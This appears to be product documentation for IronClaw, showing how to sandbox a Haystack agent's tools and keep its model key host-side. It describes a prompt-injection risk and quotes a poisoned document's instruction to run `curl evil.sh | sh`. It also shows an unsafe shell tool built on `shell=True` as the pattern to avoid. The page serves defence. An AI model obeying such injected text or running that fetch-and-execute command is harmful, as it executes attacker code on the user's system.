---
title: "Sandbox your Haystack agent with IronClaw"
description: How to sandbox a Haystack (deepset) agent or pipeline. Run your Haystack agent's untrusted tool and code execution inside IronClaw's sealed gVisor sandbox, with the model key held host-side and every tool call gated and audited, plus a credential-free way to see it work first.
---

# Sandbox your Haystack agent with IronClaw

You built an agent with **Haystack** (deepset): a pipeline or an `Agent` that wires
a chat model to a set of `Tool`s the model can call. That is a great way to design
the *behavior*. The problem starts when it runs somewhere real: a Haystack `Agent`
and its `ToolInvoker` run your tools **in your own process**, with your API key in
memory and unrestricted outbound network. One prompt-injected instruction and that
same process can read your environment, exfiltrate over the network, or call a tool
you never intended.

IronClaw runs the same job behind a **sealed sandbox** instead: no network card,
the model key held **host-side** and never in the agent, and every privileged tool
call routed through a human-approval gateway and an audit log. This page maps a
Haystack agent onto IronClaw one field at a time.

!!! example "Runnable example"
    A one-command Haystack-to-IronClaw example lives at
    [`examples/integrations/haystack`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/haystack):
    a Haystack agent whose tool and code execution is backed by an IronClaw
    sandbox, with a blocked escape attempt printed at the end. It ships with the
    integration examples. The credential-free demo below runs the same sealed loop
    today.

## The three-line fix

Stop running the agent's tools in your own process. Declare the same agent to
IronClaw and it runs inside a sealed, network-free sandbox instead:

```sh
export OPENAI_API_KEY=sk-...   # host-side only; the sandbox never sees this key
./bin/controlplane --dev --api-addr 127.0.0.1:8787 &
ironctl agent create --name "Retrieval Reporter" --provider openai --model gpt-4o \
  --instructions "Answer from the retrieved documents and cite sources." \
  --tool web_search --tool http_fetch --tool write_file --yes
```

Same persona, same model, same tools, now behind a human-approval gateway and an
audit log. The field-by-field mapping is below.

!!! info "IronClaw does not run your Python in the sandbox, and that is the point"
    IronClaw's sandbox has **no interpreter and no in-sandbox install**: you cannot
    drop arbitrary code into it, and neither can a prompt injection. So you do not
    *wrap* the Haystack process; you re-declare the same agent (persona, model,
    tools) as an IronClaw agent group, and IronClaw runs it inside the sealed
    runtime. The behavior you designed, the security posture you did not have to
    build. See [Skills](../skills.md) and [Security and isolation](../security-isolation.md).

## Why sandbox this

A typical Haystack agent:

```python
from haystack.components.agents import Agent
from haystack.components.generators.chat import OpenAIChatGenerator
from haystack.tools import Tool

shell = Tool(name="shell", description="run a command", parameters={...},
             function=lambda command: subprocess.run(command, shell=True))  # on your box
agent = Agent(chat_generator=OpenAIChatGenerator(model="gpt-4o"), tools=[shell])
agent.run(messages=[ChatMessage.from_user("summarize today's incidents")])
```

Three things are true of that snippet, and all three are risks:

1. **The key is in the process.** Anything that can read memory or `os.environ`
   can read `sk-...`.
2. **Tools run with your privileges.** The `shell` tool executes on your box with
   your filesystem and network. A poisoned document that says "run `curl evil.sh | sh`"
   is a tool call away.
3. **Egress is wide open.** The process can reach any host on the internet.

IronClaw closes all three by construction, not by convention.

## See it work first (no credentials)

Before porting anything, watch the sealed loop run with the offline `mock`
provider. No model key, no tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from haystack-land"}'

sleep 3
curl -s -H 'authorization: Bearer ironclaw-demo' \
  http://127.0.0.1:8787/v1/ui/chat/mock-agent/messages       # the reply
```

You get the reply echoed back, proof that a real per-session sandbox launched and
the answer flowed home through encrypted queues. Tear down with
`docker compose -f docker-compose.demo.yml down`. The one-command, self-checking
version, driven through a real Haystack `Tool`, is
[`examples/integrations/haystack`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/haystack).

## Port your Haystack agent

Map each part of the Haystack agent onto an IronClaw agent group:

| Haystack | IronClaw | Notes |
|---|---|---|
| `OpenAIChatGenerator(model="gpt-4o")` | `--provider openai --model gpt-4o` | Any [provider](../providers/index.md): `anthropic`, `openai`, `gemini`, `local`, and more. |
| `api_key` env in the generator | `OPENAI_API_KEY` set **on the host** | The key is injected by the host model-proxy on the way out. It never enters the sandbox. |
| `system_prompt` / persona | `--identity` / `--soul` / `--instructions` | The agent's persona, voice, and operating rules. |
| `Tool`s (`shell`, retrievers, ...) | `--tool <name>` (built-in) or an MCP server | Built-ins: `read_file`, `write_file`, `list_dir`, `web_search`, `http_fetch`. Your own tools attach over [MCP](../mcp.md). |
| `Agent.run(messages=...)` | a message to the agent group | Same request/response, now through the sealed queue. |

A Haystack agent that retrieves and writes a report becomes:

```sh
export OPENAI_API_KEY=sk-...          # host-side only; the sandbox never sees it
export IRONCLAW_API_TOKEN=$(openssl rand -hex 32)
./bin/controlplane --dev --api-addr 127.0.0.1:8787 &

ironctl agent create \
  --name "Retrieval Reporter" \
  --provider openai --model gpt-4o \
  --instructions "You answer from the retrieved documents and cite your sources." \
  --tool web_search --tool http_fetch --tool write_file --yes
```

Your Haystack tools that are *not* built in attach as an [MCP server](../mcp.md):
IronClaw registers them through the same human-approval gateway, so a new tool is a
reviewed change, not a silent capability.

## What you gained

- **The key left the agent.** It lives host-side and is injected per request; a
  compromised agent has nothing to steal.
- **`network=none` by default.** The sandbox has no NIC. The only egress is the
  audited model-proxy socket, plus whatever hosts you explicitly allowlist.
- **Privileged actions are gated.** Registering a tool, spawning another agent, or
  reaching a new host flows through a human-approval gateway and lands in the
  [audit log](../architecture.md).

Same agent you designed in Haystack. A perimeter it never had.

## Next

- [Choose your model provider](../providers/index.md)
- [MCP: bring your own tools](../mcp.md)
- [Security and isolation](../security-isolation.md)
